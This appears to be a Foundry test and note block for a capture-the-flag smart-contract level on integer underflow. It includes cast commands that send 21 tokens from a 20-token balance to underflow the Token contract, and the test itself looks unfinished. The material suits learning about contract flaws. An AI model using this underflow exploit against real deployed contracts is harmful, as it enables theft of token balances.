// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Test, console2} from "forge-std/Test.sol";
import {Token} from "../src/Token.sol";

contract TokenTest is Test {
    Token public token;
    address public attacker;
    address public randomUser;

    function setUp() public {
        token = new Token(1000);
        attacker = makeAddr("attacker");
        randomUser = makeAddr("randomUser");
    }

    function test_overflow() public {
        vm.startPrank(attacker);

        // token.transfer(randomUser, 21);
        assertGe(token.balanceOf(attacker), 20);

        vm.stopPrank();
    }
}

/*
Instance address: 0xEe8bf1D882a123eC77635741b01f0560A09Ac206
source .env
export token=0xEe8bf1D882a123eC77635741b01f0560A09Ac206
export attacker=0x7bB341488d5E6838Bb9C1fD521543f83066Dc9Bd

cast call $token "totalSupply()" --rpc-url $RPC_URL
cast call $token "balanceOf(address)(uint256)" $attacker --rpc-url $RPC_URL 
cast send $token "transfer(address,uint)" 0xbE5899c7479412c2225d1448720427A3B8424242 21 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
